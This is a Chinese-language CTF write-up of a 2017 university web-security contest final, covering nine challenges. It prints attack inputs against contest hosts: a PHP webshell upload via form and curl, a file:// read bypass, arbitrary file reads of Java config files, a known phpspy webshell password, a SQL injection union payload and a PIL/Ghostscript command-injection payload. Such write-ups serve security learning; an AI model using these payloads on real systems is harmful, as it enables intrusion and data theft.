---
title: 2017 全国大学生软件测试大赛web安全赛分区决赛 WriteUp
tags:
  - CTF
  - WriteUp
talk: true
date: 2017-10-24 13:40:13
---

周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp
<!-- more -->

## 1.host
在burpsuite中修改host为`www.mooctest.net`
![](/img/2017-mooctest-sec-1.png)

## 2.Babyupload
扫描得到upload.php，本地构造upload.html
```php
<html>
<head>
<meta charset="utf-8">
</head>
<body>

<form action="http://114.55.36.69:46012/upload.php" method="post" enctype="multipart/form-data">
    <label for="upfile">文件名：</label>
    <input type="file" name="upfile" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```
比赛的时候死活猜不出文件参数名，file、upload、uploadfile都试过，赛后经大佬提醒才知道是`upfile`  
也可以直接用curl上传文件，学到了
```
curl http://114.55.36.69:46012/upload.php -F "upfile=@x.php"
```
上传后菜刀连接，查看web目录下的flag.php拿到flag
![](/img/2017-mooctest-sec-2.png)

## 3.curl
过滤了`file:`后面的`/`，把`/`转成`0x2f`  
```
http://114.55.36.69:46013/index.php?url=file:0x2f0x2f/var/www/html/index.php
```
![](/img/2017-mooctest-sec-3.png)

## 4.war
根据题目提示，下载trick-or-treat.war
![](/img/2017-mooctest-sec-4.png)

## 5.readme2
在js文件里发现
```
http://114.55.36.69:46015/test/show.do?page=help.jsp
```
猜测是任意文件读取，读取javaweb工程的`WEB-INF/web.xml`文件
![](/img/2017-mooctest-sec-5.png)
接着读取`WEB-INF/properties/configInfo.properties`
![](/img/2017-mooctest-sec-6.png)
发现`key.jsp`，读取`key.jsp`
![](/img/2017-mooctest-sec-7.png)

## 6.source ip
去fofa搜标题，试了三四个就试出来了，听说还有发邮件姿势更优雅
![](/img/2017-mooctest-sec-8.png)

## 7.hackedsite
扫描得到
```
http://118.178.18.181:46017/upload/phpspy.php
```
百度搜索phpspy得到密码`angle`，连接大马拿到flag
![](/img/2017-mooctest-sec-9.png)

## 8.babysql3
name字段存在注入，构造
```
keyname=1&name=name` union select 1,2,flag from flag %23
```
![](/img/2017-mooctest-sec-10.png)

## 9.snake
提示了`PIL-RCE`
参考https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md
构造poc文件中的代码为
```
(%pipe%cat /var/www/Flask/flag > tmp/fffffff.png)
```
上传得到flag
![](/img/2017-mooctest-sec-11.png)

## 10.thinkphp5
无




